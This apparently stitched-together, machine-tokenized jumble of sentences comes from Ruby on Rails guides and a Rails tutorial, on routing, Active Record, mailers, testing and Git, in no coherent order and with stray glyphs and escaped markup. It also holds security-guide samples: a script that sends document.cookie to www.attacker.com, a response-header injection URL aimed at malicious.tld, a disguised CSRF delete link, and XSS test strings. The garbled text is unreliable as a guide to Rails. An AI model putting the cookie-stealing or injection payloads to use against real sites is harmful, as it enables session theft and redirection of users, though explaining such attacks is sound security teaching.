We &apos;ll then use the failing test to drive the writing of the application code .
# # # # `take`
* `customers / _ customer ▖ html ▖ erb`
You can also pass in a `layout : &apos; layout _ name &apos; ` option to the render call inside ╼ the format block to specify different layouts for different formats :
no changes added to commit ( use &quot; git add &quot; and / or &quot; git commit -a &quot; )

Note that the final step is necessary to write the changes to the database .
Elimination of many external dependencies ( RSpec , Cucumber , Capybara , Factory Girl )
To follow a user , we post to the relationships path and verify that the number of followed users increases by ~ 1 :
And the groups that have them are always the last ones .
In earlier versions , a `HashWithIndifferentAccess` was used .
A form for unfollowing a user .
Default is false .
Although we don &apos;t yet know how to implement it , we can already write tests for its functionality .
As a capstone to our work on the layout and routing , in this section we &apos;ll make a route for the signup page , which will mean creating a second controller along the way .
The ╼ following pointers may be helpful :
# # # # Scopes for `belongs _ to`
&lt; small &gt; By &lt; % = article ▖ author % &gt; &lt; / small &gt;
Calling `content _ for` stores a block of markup in an identifier for later use .
We &apos;ll then create our first Rails application , called ( appropriately enough ) \ kode { first \ _ app } .
Now it ╼ is merged like any other scope .

Here &apos;s the revised code for setting up customers and orders :
This requires a \ kode { before \ _ create } callback , which we &apos;ll define as follows :

Showing the users the given user is following .

Active Record uses naming conventions for the columns in database tables , ╼ depending on the purpose of these columns .
Now , when we visit / users / 1 , the Rails server shows a \ kode { byebug } prompt :

SafeErb reminds you to escape strings from external sources .
&lt; li &gt; ` : file` : save emails to files ; can be configured by using `config ▖ action _ mailer ▖ file _ settings` ▖ &lt; / li &gt;

You can do so by running :
The same format can be used to set carbon copy ( Cc : ) and blind carbon copy ╼ ( Bcc : ) recipients , by using the ` : cc` and ` : bcc` keys respectively .
Instead , hash indices , or \ emph { keys } , can be almost any object .
# # # # time _ zone _ select
In other words , the dot \ kode { ▖ } in \ kode { ▖ center } indicates that the rule styles a class .
A custom prefix may also be configured :
When we write
In the process , we &apos;ll see a first example of the branch , edit , commit , merge workflow that I recommend using with Git

Here is the sequence I recommend :

To apply it , we just migrate the database :
This will enable Rails to recognize paths such as ` / comments / new / preview` with GET , and route to the `preview` action of `CommentsController` .
In particular , it doesn &apos;t enforce any constraints on the uploaded file , which can cause problems if users try to upload large files of invalid file types .
Create a new file at `app / views / blorgh / comments / _ comment ▖ html ▖ erb` and put this ╼ line inside it :
There &apos;s also a related idiom that uses the splat operator :

Here we tell Factory Girl about the micropost &apos;s associated user just by including a user in the definition of the factory :
Previously , calling a mailer method on a mailer class will result in the ╼ corresponding instance method being executed directly .
It then uses \ kode { cookies } to create permanent cookies for the user id and remember token as described above .
For example `seconds _ since _ midnight` might not return the real amount in such a day .

Finally , since the \ emph { Ruby on Rails Tutorial } uses Rails ~ 4 , the knowledge you gain here represents the state of the art in web development .
even though the underlying model is called Relationship .
The index by itself doesn &apos;t enforce uniqueness , but the option \ kode { unique : true } does .
To help understand where this comes from , Table ~ \ ref { table : valid _ email _ regex } breaks it into bite-sized pieces

Wrap this block around expensive operations or possible bottlenecks to get a time reading for the operation .

A controller &apos;s purpose is to receive specific requests for the application ▖ ╼
One annoyance associated with using the \ kode { rspec } command is having to switch to the command line and run the tests by hand .
The SQL equivalent of the above is :
Thus , to be as secure as possible , we will err on the side of caution and use private repositories by default .
Note that the name of the migration file is prefixed by a \ emph { timestamp } based on when the migration was generated .
If it doesn &apos;t , then `create` is called .
If you don &apos;t have automated tests that exercise the bulk of your application , you &apos;ll need to spend time manually exercising all the parts that have changed .

Then initialize a Git repository and make the first commit :
Each name includes the &quot; @ &quot; sign .

The Rails way to accomplish this is to use a special variable called the \ emph { flash } , which we can treat like a hash .
# # # Connecting URLs to Code
The `where` method lets you specify the conditions that the associated object must meet .
TIP : If you want to link to an action in the same controller , you don &apos;t need to ╼ specify the ` : controller` option , as Rails will use the current controller by ╼ default .
If you &apos;re using Git for version control , you should run the following command :

Finally , it &apos;s often convenient to use the ternary operator in a function &apos;s return value :
You can use the ` : layout` option to tell Rails to use a specific file as the layout for the current action :
The account activation text view .
Do not attempt to use `include ? ` to enforce distinctness ╼ in an association .

Since the security restrictions for the \ kode { edit } and \ kode { update } actions are identical , we &apos;ll handle them in a single RSpec \ kode { describe } block .
First we generate the relevant test :
Now that you &apos;ve seen how to create a controller , an action and a view , let &apos;s ╼ create something with a bit more substance .

Ruby has a built-in method `Hash # merge` that merges two hashes :
Note that , because it is now raw SQL , \ kode { followed \ _ user \ _ ids } is \ emph { interpolated } , not escaped .
Note that the family of `require` directives prevents files ╼ from being included twice in the output .
We &apos;ll see in the next two sections what effects this has .
Open `doc / guides / index ▖ html` in your ╼ web browser to explore the Guides .
In this case , you can use a singular resource to map ` / profile` ( rather than ` / profile / : id` ) to the `show` action :

so that the root route went to the \ kode { hello } action in the Application controller .
We can easily add behavior to any link by adding the data ╼ attribute .

In this context , having the hello , toy , and sample apps present in the same project can be inconvenient due to the many common filenames .
In this case , using ` @ parts ▖ assemblies ▖ create` or ` @ parts ▖ assemblies ▖ build` will create orders where the `factory` column has the value &quot; Seattle &quot; .

In particular , we &apos;ll make an \ kode { activate } method to update the user &apos;s activation attributes and a \ kode { send \ _ activation \ _ email } to send the activation email .
By default this is `false` in test mode and `true` in all other modes .

For example , suppose your application includes these models :
You can also pass in arbitrary local variables to any partial you are rendering with the `locals : { } ` option :
You can use the ` : location` option to set the HTTP `Location` header :

For example , \ kode { name } should be non-blank , and \ kode { email } should match the specific format characteristic of email addresses .
By design , the Faker gem &apos;s \ emph { lorem ipsum } text is randomized , so the contents of your sample microposts will differ .

In this section , we cover two of the most important improvements , \ emph { nesting } and \ emph { variables } .
Adding a \ kode { hello } action to the Application controller .
You can find detailed instructions on how to test your mailers in the ╼ &#91; testing guide &#93; ( testing ▖ html # testing-your-mailers ) .
In this case , you could include this route declaration :

The simplest template that would work in this case would be one located at ╼ `app / views / articles / new ▖ html ▖ erb` .
# # # # url _ field

Regardless of which database system you &apos;re using , the Active Record method format will always be the same .
Because web applications have so many moving parts , they offer ample opportunities to develop your technical sophistication .
Note here , ╼ however , that the migration is called `create _ blorgh _ articles` rather than the ╼ usual `create _ articles` .
You may recall from Section ~ \ ref { sec : a _ class _ of _ our _ own } that Ruby lets you add methods to \ emph { any } class , even built-in ones .
We use the complementary method \ kode { after ( : all ) } to delete the users once we &apos;re done .

These actions will perform CRUD operations on the articles ╼ within our system .
Each finder method allows you to pass arguments into it to perform certain queries on your database without writing raw SQL .
The format for this ╼ template can only be `html` and the handler must be one of `erb` , `builder` or ╼ `coffee` .
Our strategy for handling account activation parallels user login \ linebreak ( Section ~ \ ref { sec : logging _ in } ) and especially remembering users ( Section ~ \ ref { sec : remember _ me } ) .
In some applications , this initial implementation might be good enough for most practical purposes .
Putting the variable directly into the conditions string will pass the variable to the database * * as-is * * .

-134 ▖ ordinal # = &gt; &quot; th &quot;
Passing in a ╼ symbol ( ` : article` ) with the same name as the instance variable ( ` @ article` ) ╼ also automagically leads to the same behavior .

Let &apos;s take a moment to discuss its structure .
With the addition of the Microposts resource , we are nearly finished with our sample application .
We next define the form for creating microposts ( Listing ~ \ ref { code : micropost _ form } ) , which is similar to the signup form in Listing ~ \ ref { code : signup _ form } .

Although the view will exist as a single page of code , each profile will be customized using information retrieved from the application &apos;s database .
Note that Listing ~ \ ref { code : user _ signup _ with _ account _ activation } has changed the redirect behavior upon signing up .
Write tests for the stats on the Home and profile pages .
destroy
# &lt; foo type = &quot; integer &quot; &gt; 1 &lt; / foo &gt;
( We &apos;ll discuss \ kode { private } in more detail in Section ~ \ ref { sec : remember _ me } ▖ )
in Listing ~ \ ref { code : user _ edit _ view } .
* ` : in` ( or ` : within` ) - The attribute length must be included in a given ╼ interval .
As usual , it &apos;s a good idea to verify that the test suite is green before proceeding :
There are two types of form helpers : those that specifically work with model attributes and those that don &apos;t .
# # # # `split ( value = nil ) `
&lt; a href = &apos; http : / / example ▖ com / articles / 1 / destroy &apos; &gt; look at this cat !
&lt; p &gt; Hello there , this is our image &lt; / p &gt;
This can be undone using
When no CDN is used , a ╼ browser will use this information to cache contents .

And we &apos;ll see in Section ~ \ ref { sec : unsuccessful _ signups } how validations give us convenient error messages when users make submissions that violate them .
When presented with a cookie containing a persistent user id , find the user in the database using the given id , and verify that the remember token cookie matches the associated hash digest from the database .
Besides ` : only _ integer` , this helper also accepts the following options to add ╼ constraints to acceptable values :
To add a route to the collection :
The form itself appears as in Listing ~ \ ref { code : signup _ form } .
By definition all objects are `duplicable ? ` except `nil` , `false` , `true` , symbols , numbers , class , module , and method objects .
If `return` is needed it is recommended to explicitly define a method .

as shown in Listing ~ \ ref { code : sample _ app _ readme } .
Unfortunately , experience shows that even minor point releases can break things , so for the \ emph { Rails Tutorial } we &apos;ll err on the side of caution by including exact version numbers for virtually all gems .
&#124; ` { &quot; person &quot; : &#91; &quot; foo &quot; , null &#93; } ` &#124; ` { : person = &gt; &#91; &quot; foo &quot; &#93; } ` &#124;

Then we deploy , reset the database , and reseed the sample data :

# &lt; url-id &gt; david-heinemeier-hansson &lt; / url-id &gt;
Here is the most straightforward test to check for XSS :
The test appears as in Listing ~ \ ref { code : contact _ page _ test } , which simply follows the model last seen in Listing ~ \ ref { code : title _ tests } .

The first step toward getting custom CSS to work is to create such a custom CSS file :
A preview of HTML version of the account activation email .
First , we need to define \ kode { @ micropost } , which ( as before ) we do through the association :
because otherwise Rails would look for a \ kode { ReverseRelationship } class , which doesn &apos;t exist .
When finished , press &quot; Send ╼ pull request &quot; .
The new micropost page ( \ href { http : / / localhost : 3000 / microposts / new } { / microposts / new } ) .
You can see that the code uses `try` and avoids an unnecessary check .
In other words , where the \ kode { relationships } association uses the \ kode { follower \ _ id } foreign key ,

as shown in Listing ~ \ ref { code : sign _ in _ with _ remember } .

Alternatively , you can also do it through the `config` method on the `Rails ▖ application` object :
To show the comments on an article , edit `app / views / blorgh / articles / show ▖ html ▖ erb` and ╼ add this line before the &quot; Edit &quot; link :

In Chapter ~ \ ref { cha : log _ in _ log _ out } , we will complete our authentication machinery by allowing users to log in and out of the application .
* = require _ self
Note that , in order to ensure that the command uses the version of Rake corresponding to our \ kode { Gemfile } , we need to run \ kode { rake } using \ kode { bundle exec } .
* `config ▖ action _ mailer ▖ default _ options` configures Action Mailer defaults .
Only logging out if logged in .
produces a URL of the form

On the other hand , for the sample application we &apos;ll also need two gems we didn &apos;t need before : the gem for RSpec and the gem for the RSpec library specific to Rails .
Migrations allow us to modify our application &apos;s data model .
By default `to _ param` just calls `to _ s` :

For example , you get rid of the duplication in :
# # # `only`

Moreover , by considering \ emph { reverse } relationships , we could use the \ kode { follower \ _ id } column to extract an array of user &apos;s followers .
In the unlikely event that finding the count is still a bottleneck in your application , you can make it even faster with a \ href { http : / / railscasts ▖ com / episodes / 23-counter-cache-column } { \ emph { counter cache } } .

Apart from proper ordering , there is a second refinement we &apos;d like to add to microposts .

This choice is based on the \ href { http : / / railscasts ▖ com / episodes / 274-remember-me-reset-password } { RailsCast on remember me } .
An equivalent formulation of Listing ~ \ ref { code : validates _ presence _ of _ name } using parentheses is as follows :
When you assign an object to a `has _ and _ belongs _ to _ many` association , that object is automatically saved ( in order to update the join table ) .

Many popular UNIX-like OSes ship with an acceptable version of SQLite3 .

You then have a corresponding ╼ `app / views / users / create ▖ js ▖ erb` view file that generates the actual JavaScript ╼ code that will be sent and executed on the client side .
The demo app developed in this chapter has several strengths and a host of weaknesses .
For example , if you generate a `ProjectsController` , Rails will also add a new ╼ file at `app / assets / javascripts / projects ▖ js ▖ coffee` and another at ╼ `app / assets / stylesheets / projects ▖ css ▖ scss` .
Formats a number with the specified level of `precision` , which defaults to 3 .
Rails is a web application development framework written in the Ruby language .

Rails determines the name of the partial to use by looking at the model name in the collection .

This evaluates to \ kode { session &#91; : return \ _ to &#93; } unless it &apos;s \ kode { nil } , in which case it evaluates to the given default URL .
Because the user isn &apos;t valid , an attempt to save the user to the database automatically fails :

Since we then save \ kode { @ user } , the duplicate user has an email address that already exists in the database , and hence should not be valid .

In ╼ Active Record , objects carry both persistent data and behavior which ╼ operates on that data .
If you prefer , you can use a symbol instead of a string to specify the action to render :
Because we wrote the application code before the integration test , the test suite should be \ passing :

Without associations , the model declarations would look like this :
RedCloth ▖ new ( &apos; &lt; script &gt; alert ( 1 ) &lt; / script &gt; &apos; , &#91; : filter _ html &#93; ) ▖ to _ html
When queries are executed on this model , the SQL query will now look something like ╼ this :
Here , we expect it to be more complicated , something like this :
The way to do this is with the \ kode { cookies } method , which ( as with \ kode { session } ) we can treat as a hash .
If this example strikes you as a bit contrived , good---this is by design .
# Try to log in before activation .
scope : created _ before , - &gt; ( time ) { where ( &quot; created _ at &lt; ? &quot; , time ) }
mail ( to : user ▖ email ) do &#124; format &#124;
They are designed to be a sanity check , not to be comprehensive .
Using `render : text` may pose a security risk , as the content is sent as ╼ `text / html` .
The feed for a user ( id 1 ) following users 2 , 7 , 8 , and 10 .
Unfortunately , the User request spec is now broken because the signup and edit forms use the old version of the error messages partial .

Instead of returning a path such as ` / assets / smile ▖ png` ( digests are left out ╼ for readability ) .
You should also update your application ╼ file ( in `config / application ▖ rb` ) :
Note that the Rails generator automatically appends \ kode { \ _ test } to the name of the test file .
Rails will then output a `script` tag such as this :

With the data modeling complete , we &apos;re now ready to add the code needed to send an account activation email .
As you can verify by inspecting the navigation in your browser , once Rails has processed the layout and evaluated the embedded Ruby the list looks like this
* ` : nullify` causes the foreign key to be set to `NULL` .
if @ article ▖ update ( article _ params )
* Convert the supplied options to an equivalent SQL query .
The logout link , meanwhile , uses the logout path defined in Listing ~ \ ref { code : sessions _ resource } :
That seems to me a logical division , but putting them all in the \ kode { shared } folder certainly works fine , too .
This means the methods `sanitize` , `sanitize _ css` , `strip _ tags` and ╼ `strip _ links` are backed by a new implementation .
# @ business and @ user instance variables here

* `config ▖ action _ dispatch ▖ tld _ length` sets the TLD ( top-level domain ) length for the application .
This means that , even if our database is compromised , our users &apos; passwords will still be secure .

The tests initially fail , as required :
# Handle a successful update .
def check _ credit _ limit ( order )
This requires the use of the ``not &apos; &apos; operator , written using an exclamation point ~ \ kode { ! } and usually read as ``bang &apos; &apos; .
Of course , at this point the tests should fail :

To duplicate relatively simple objects such as arrays , we can use the \ kode { dup } method :

This suggests placing the method in \ kode { user ▖ rb } .
Although Rails is designed for making database-backed dynamic websites , it also excels at making the kind of static pages we might make with raw HTML files .

When we last left the Home page , it appeared as in Figure ~ \ ref { fig : sample _ app _ logo } ---that is , it had a ``Sign up now ! &apos; &apos; button in the middle .
Finally , we &apos;ll add some rules to style the site &apos;s logo , which simply consists of the text ``sample app &apos; &apos; .

For cases such as the one in this chapter , the advantage over Active Record may not be obvious , but we &apos;ll use more advanced features of factories in future chapters .

Even at this early stage , it &apos;s helpful to get a high-level overview of how Rails applications work ( Figure ~ \ ref { fig : MVC } ) .
Before moving on to tackle any of the application extensions , it &apos;s a good idea to merge in your changes :
The test appears as in Listing ~ \ ref { code : contact _ page _ test } , which simply follows the model last seen in Listing ~ \ ref { code : pages _ controller _ spec _ title } .
Here are some suggestions based on my own experience :
# Use ActiveModel has _ secure _ password
The login page with a ``forgot password &apos; &apos; link .
# you &apos;ve limited to : test , : development , or : production .

For example , a new Rails 4 application includes a default ╼ `app / assets / javascripts / application ▖ js` file containing the following lines :
Testing the micropost order .
The additional assertions in Listing ~ \ ref { code : image _ upload _ test } check both for a file upload field on the Home page and for a valid image attribute on the micropost resulting from valid submission .
Let &apos;s focus on one particular line in Listing ~ \ ref { code : application _ layout _ redux } :
The ` : source` option specifies the source association name for a `has _ one : through` association .
Now let &apos;s take a look at the above steps in more detail .
# You can use `rake secret` to generate a secure secret key .
Currently , the test for valid submission should be failing :
I shall be late ! &quot; ▖ truncate _ words ( 4 , separator : / \ s / )
This error occurs because the route needs to have a controller defined in order ╼ to serve the request .

You can also specify the ` : shallow` option in the parent resource , in which case all of the nested resources will be shallow :
This simply involves filling in the second arguments of the \ kode { link \ _ to } functions with the proper named routes .
&#124; &#124; 508 &#124; : loop _ detected &#124;
If you have an extension that should be shared by many associations , you can use a named extension module .

To verify the behavior of the ``remember me &apos; &apos; checkbox , we &apos;ll write two tests , one each for submitting with and without the checkbox checked .

Finally , we &apos;ll put the toy app under version control with Git :
The view converts its contents to HTML ( Step ~ 7 ) , which is then returned by the controller to the browser for display ( Step ~ 8 ) .
We could fix the problem by putting \ kode { root \ _ url } in parentheses , but the idiomatically correct way to do it is to use \ kode { and } instead .
Rails understands both numeric status codes and the corresponding symbols shown below .

The default error message is _ &quot; is invalid &quot; _ .
If you are using Rails with the &quot; Asset Pipeline &quot; enabled , this helper will generate a link to ` / assets / stylesheets / ` .
The first practical application of logging in involves changing the layout links based on login status .
We &apos;re now ready to commit the changes on our topic branch and merge back to master :

Active Support provides `duplicable ? ` to programmatically query an object about this property :
mattr _ accessor : constant _ watch _ stack _ mutex
page to show micropost with id \ kode { 1 }
create _ table : accounts do &#124; t &#124;
delete a session ( log out )
At the moment , ╼ &quot; Welcome aboard &quot; is occupying that spot .
The initial spec for users , with a test for the signup page .
It &apos;s worth noting that this error-messages partial is only a first attempt ; the final version appears in Section ~ \ ref { sec : creating _ microposts } .
# Precompile additional assets ( application ▖ js , application ▖ css , and all non-JS / CSS are already added )
Therefore , constraint values should match the corresponding Request object method return type .
\ emph { Extra credit : } Organize the support code into separate files and modules , and get everything to work by including the modules properly in the spec helper file .
as seen in Listing ~ \ ref { code : gemfile _ sqlite _ version } .
( I &apos;ve taken the liberty of associating the first few sample addresses with photos so that they &apos;re not all the default Gravatar image ▖ )
In addition , after an invalid submission Rails automatically wraps the fields with errors in \ kode { div } s with the CSS class \ kode { field \ _ with \ _ errors } .
To get links of the form
* `autoplay : true` , starts playing the video on page load .
* `config ▖ file _ watcher` the class used to detect file updates in the filesystem when `config ▖ reload _ classes _ only _ on _ change` is true .
One example is the \ kode { to \ _ s } method that can convert virtually any object to a string :
If you need to do more complex things with a default scope , you can alternatively ╼ define it as a class method :
# = &gt; 12 ▖ 345 ▖ 678
# Rails &lt; 4 ▖ 1
http : / / www ▖ yourapplication ▖ com / controller / action ? referer = path / at / your / app % 0d % 0aLocation : + http : / / www ▖ malicious ▖ tld
# # # Mailer Views
The `collection ▖ empty ? ` method returns `true` if the collection does not contain any associated objects .
as shown in Listing ~ \ ref { code : cgi _ escape } .
We can get the REST-style URL to work by adding a single line to our routes file ( \ kode { config / routes ▖ rb } ) :

The bottom line is that \ kode { : name = &gt; } and \ kode { name : } are effectively the same \ emph { only inside literal hashes } , so that
Merge the new content :
To filter the processes by type , you can run the results of \ texttt { ps } through the \ texttt { grep } pattern-matcher using a Unix pipe ~ \ texttt { &#124; } :
GH # 1234
# # # # number _ to _ currency
While we &apos;re at it , we &apos;ll follow a common web convention and link the logo to the Home page as well .
This ensures that the same version of Rails we installed in Listing ~ \ ref { code : installing _ rails } is used to create the first application &apos;s file structure .
as shown in Listing ~ \ ref { code : forget _ test } .
The first is the new Home page sidebar , as shown in Listing ~ \ ref { code : user _ info } .
Recalling that
Rails has several initializers that run on startup that are all defined by using the `initializer` method from `Rails : : Railtie` .
As a result , most web frameworks have a plethora of options for implementing such systems , and Rails is no exception .
Since \ texttt { nil } is false in a boolean context , the first assignment to \ texttt { @ foo } is \ texttt { nil &#124; &#124; &quot; bar &quot; } , which evaluates to \ texttt { &quot; bar &quot; } .
* Database Table - Plural with underscores separating words ( e ▖ g ▖ , `book _ clubs` ) .
* Rails 4 ▖ 0 has removed the XML parameters parser .

The next set of tests makes sure that , for signed-in users , the index page has the right title / content and lists all of the site &apos;s users .
The \ kode { Feature } and \ kode { Scenario } lines are mainly for documentation , but each of the other lines needs some corresponding Ruby .
The updated partials appear in Listing ~ \ ref { code : follow _ form _ ajax } and Listing ~ \ ref { code : unfollow _ form _ ajax } .
In particular , \ kode { Rails ▖ env ▖ development ? } \ is \ kode { true } only in a development environment , so the embedded Ruby

We &apos;ll start by making a partial to display the following and follower statistics on the profile and home pages .

The view for the Help page with an embedded Ruby title .
Action Mailer Configuration
New routes are defined in the file \ kode { config / routes ▖ rb } .
The syntax
This technique should be used with caution .
Creating a resourceful route will also expose a number of helpers to the controllers in your application .
In particular , simple routing makes it very easy to map legacy URLs to new Rails actions .
assemblies ▖ find ( ▖ ▖ ▖ )
&lt; div style = &quot; background : url ( &apos; javascript : alert ( 1 ) &apos; ) &quot; &gt;
&lt; h1 &gt; New Article &lt; / h1 &gt;

as shown in Listing ~ \ ref { code : Gemfile _ pg _ gem } .
&lt; script &gt; document ▖ write ( &apos; &lt; img src = &quot; http : / / www ▖ attacker ▖ com / &apos; + document ▖ cookie + &apos; &quot; &gt; &apos; ) ; &lt; / script &gt;
It &apos;s time to create a second one , the Users controller .
Note that we write the commit message in the \ emph { present } tense .
`beginning _ of _ quarter` is aliased to `at _ beginning _ of _ quarter` , and `end _ of _ quarter` is aliased to `at _ end _ of _ quarter` .
Null Relation
Of course , after this minor refactoring the test suite should still be \ passing :

Since a user object is neither \ kode { nil } nor \ kode { false } , it does the job nicely
The \ kode { &lt; nav &gt; } tag , though formally unnecessary here , is used to more clearly communicate the purpose of the navigation links .
Putting all this together gives the updated micropost fixtures in Listing ~ \ ref { code : updated _ micropost _ fixtures } .
By the way , if you ever make a mistake when generating code , it &apos;s useful to know how to reverse the process .
You should use this helper when your model has associations with other models ╼ and they also need to be validated .
* Avoiding name collisions
* `before _ perform`
# # # # # `create _ association ( attributes = { } ) `
In this section of the guide you &apos;ll learn how to setup the tests on your own computer .
Study the entry in the Rails API for the \ kode { validates } method to learn more about its capabilities and options .

Of course , currently user activation doesn &apos;t actually \ emph { do } anything , because we haven &apos;t changed how users log in .
If there &apos;s any element that does not belong to the type of the first one the root node becomes &quot; objects &quot; :
The string &apos; foobar &apos; is nonempty .
Before filters use the \ kode { before \ _ action } command to arrange for a particular method to be called before the given actions
# If the user is locked the increment is lost , no big deal .
* For `belongs _ to` associations , `has _ many` inverse associations are ignored .
If any INSERT or UPDATE takes place then the cache is cleaned .
* How to find records using a variety of methods and conditions .
* `Time` understands DST , so you get correct DST calculations as in
For example , this association uses two such options :
The application code simply involves calling \ kode { log \ _ out } only if \ kode { logged \ _ in ? } \ is true , as shown in Listing ~ \ ref { code : destroy _ forget } .
class _ attribute : x
* `resource _ controller` defines which generator to use for generating a controller when using `rails generate resource` .
# # # The Rake Task
* ` : authentication` - If your mail server requires authentication , you need to specify the authentication type here .
Since `errors &#91; : base &#93; ` is an array , you can simply add a string to it and it will be used as an error message .
A mockup of the user followers page .

This prevents a third-party site from referencing ╼ your JavaScript URL and attempting to run it to extract sensitive data .

For a freshly generated Rails application , this might produce something like :
to get to the same place , but \ kode { / about } is more succinct .

Now that we have a helper , we can use it to simplify our layout by replacing

Rails ╼ will default to `text / plain` otherwise .
Although people are sometimes sloppy about including the \ kode { alt } attribute for images , it is in fact required by the HTML standard .
Although we won &apos;t need the Microposts controller until Section ~ \ ref { sec : manipulating _ microposts } , we will need the views directory in just a moment , so let &apos;s generate the controller now :
* `before _ configuration` : This is run as soon as the application constant inherits from `Rails : : Application` .

Using an engine within an application is very easy .
NOTE : The `ApplicationController` class being inherited from here is the ╼ `Blorgh : : ApplicationController` , not an application &apos;s `ApplicationController` .
If you &apos;d like to use a different status code , perhaps 301 , a permanent redirect , you can use the ` : status` option :
Go ahead , play around with the ╼ newly mounted engine .

In this section , we &apos;ll take the first steps toward the final profile by making a page to display a user &apos;s name and profile photo , as indicated by the mockup in Figure ~ \ ref { fig : profile _ mockup _ profile _ name }
You can pass in a numerical argument to the `last` method to return up to that number of results .
We &apos;ll put this fact to good use starting in Section ~ \ ref { sec : showing _ microposts } ▖ )
Once you &apos;ve created the \ kode { about ▖ html ▖ erb } file in the right directory , you should fill it with the contents shown in Listing ~ \ ref { code : custom _ about _ page } .

This may be handy for example to get a better name :
A partial for displaying follower stats .
When writing CoffeeScript , you &apos;ll often want to do some sort of processing upon ╼ page load .
JavaScript can also make requests to the server , and parse the response .
See &#91; Security Guide &#93; ( security ▖ html # unsafe-query-generation ) ╼ for more information .
So first , let &apos;s add the delete link in the ╼ `app / views / comments / _ comment ▖ html ▖ erb` partial :
Because we &apos;re modeling activations using an Account Activations resource , the token itself can appear as the argument of the named route defined in Listing ~ \ ref { code : account _ activations _ route } :
Of course , requiring users to log in isn &apos;t quite enough ; users should only be allowed to edit their \ emph { own } information .
Creating a New Rails Project

There is at least one exception , however : The output has to be escaped in the controller already , if the action doesn &apos;t render a view .

To add page titles , we need to learn ( or review ) the structure of a typical web page , which takes the form shown in Listing ~ \ ref { code : html _ structure } .
The entire HTML skeleton structure is repeated on each page .
Before filters give a standard way to run methods before particular controller actions .
the \ kode { reverse \ _ relationships } association uses \ kode { followed \ _ id } :
create app / models / user ▖ rb

&quot; BigDecimal &quot; = &gt; &quot; decimal &quot; ,
The raw home view ( \ href { http : / / localhost : 3000 / static _ pages / home } { / static \ _ pages / home } ) .
If authenticated , present the user with the form for changing the password .
The debug output in Figure ~ \ ref { fig : home _ page _ with _ debug } gives potentially useful information about the page being rendered :
* This is a manifest file that &apos;ll automatically include all the stylesheets
While Rails uses intelligent defaults that will work well in most situations , there may be times when you want to customize the behavior of the `has _ one` association reference .
It &apos;s worth noting that this chapter saw the last of the necessary gem installations .
# # # Bound Parameters
Silencing exceptions is also possible with `suppress` .
If the block returns the same value for different elements no collection is built for that key .

in Listing ~ \ ref { code : f _ error _ messages } .
We could also assign both strings a variable name :
A \ kode { Gemfile } with added gems and explicit Ruby version .
This simplifies maintenance and keeps things clean by allowing related code to ╼ be grouped before inclusion elsewhere .
As with the Users resource , we can use the \ kode { resources } method to define the standard RESTful routes :

We &apos;ll follow the common convention of redirecting to the newly created user &apos;s profile , although the root path would also work .
With that , we can run the local web server using \ kode { rails s } , which is a shortcut for \ kode { rails server } :
Remember you must also remove any references to the middleware from your application code , for example :

Spork is especially useful when used with Guard , which we can arrange as follows :

We still need a way to list all our articles , so let &apos;s do that .

There are a variety of ways to customize the behavior of `render` .
This allows only the given tags and does a good job , even against all kinds of tricks and malformed tags .
In particular , \ kode { params } contains a nested hash of the form
create
If `config ▖ assets ▖ digest` is also true , the asset pipeline will require that ╼ all requests for assets include digests .
Similarly , we can move the header material into the partial shown in Listing ~ \ ref { code : header _ partial } and insert it into the layout with another call to \ kode { render } .
# # # # # The ` : status` Option
This method works like its brothers , `attr _ accessor` and `cattr _ accessor` , but ╼ provides a setter and getter method on the module with the specified name .
The presence of the \ kode { do } keyword indicates that \ kode { form \ _ for } takes a block with one variable , which we &apos;ve called \ kode { f } ( for ``form &apos; &apos; ) .
For completeness , we &apos;ll usually use this method to run the tests through the rest of the tutorial .
At this point the tests should pass :
Then implement an RSS feed for their status feed , optionally restricting access to that feed using an authentication scheme .
route &quot; root to : &apos; people # index &apos; &quot;
$ git push origin my _ pull _ request -f
This is especially appropriate on sites containing sensitive information , such as banking and financial trading accounts .
There are some situations where your engine &apos;s assets are not required by the ╼ host application .
Somehow , we want to be able to make this \ emph { variable } , so we can call

But there are no quotes allowed in the payload , because single and double quotes have already been used .
This typically involves installing \ emph { gems } , which are self-contained packages of Ruby code .
It implements that control via `assert _ valid _ keys` .
This means that instead of ╼ `http : / / localhost : 3000 / blorgh / articles` , you only need to go to ╼ `http : / / localhost : 3000 / blorgh` now .
Since we &apos;ll be using this sample app throughout the rest of the book , it &apos;s a good idea to \ href { https : / / bitbucket ▖ org / repo / create } { create a new repository at Bitbucket } and push it up :

There are many other examples of coupling between our tests and the site &apos;s implementation .

There are three tag options available for the `auto _ discovery _ link _ tag` :
Following the practice from Section ~ \ ref { sec : requiring _ signed _ in _ users } , we &apos;ll put action-level tests of access control in the Users controller test file .
At this point , the presence validations are complete , and the test suite should be \ passing :
The new user page ( \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / new } { / users / new } ) .
A user profile with an unfollow button ( \ href { http : / / localhost : 3000 / users / 5 } { / users / 5 } ) .
Automated testing allows us to write test suites that drive the development of new features , allow for confident refactoring , and catch regressions .
* `ActionDispatch : : Callbacks` runs the prepare callbacks before serving the request .
Such an expression is evaluated in the context of the receiver :

With this declaration , all of the views rendered by the `ProductsController` will use `app / views / layouts / inventory ▖ html ▖ erb` as their layout .
Our plan in the case of following / followers pages is to check the number is correctly displayed and that links with the right URLs appear on the page .

Never ever put your arguments directly inside the conditions string .
This causes Rails to look for a partial with the corresponding name in the views directory of the given resource :
&gt; &gt; Rails ▖ env ▖ test ?
This works exactly the same as :
With that configuration you get a user &apos;s name via their profile , `user ▖ profile ▖ name` , but it could be handy to still be able to access such attribute directly :
in Listing ~ \ ref { code : stub _ user _ view } .
Like the \ kode { user \ _ id } , the \ kode { content } attribute must be present , and it is further constrained to be no longer than 140 characters , making it an honest \ emph { micro } post .
The files in this directory can be used to hold configuration settings that should be made after all of the frameworks are loaded .
For example :
The idea is that if ╼ you configure your applications in the very same way most of the time then this ╼ should be the default way .
* `config ▖ dependency _ loading` is a flag that allows you to disable constant autoloading setting it to false .

Verify that \ kode { current \ _ user } is equal to the given user .
Performing Custom Validations
end _ of _ year ( at _ end _ of _ year )
Showing the given user &apos;s followers .
Then commit the changes and push up to Heroku :
Mailers are structured much like controller actions , with email templates defined as views .
d = Date ▖ new ( 2012 , 9 , 10 ) # = &gt; Mon , 10 Sep 2012
For simplicity , all command line examples use a Unix-style command line prompt ( a dollar sign ) , as follows :
This is not a cause for concern , as Ruby ignores extra newlines .
~ / ▖ irbrc
&lt; % = f ▖ text _ area : body % &gt; &lt; br &gt;
To avoid the ( huge ) full installation , I recommend the much smaller \ href { https : / / developer ▖ apple ▖ com / downloads / } { Command Line Tools for Xcode }
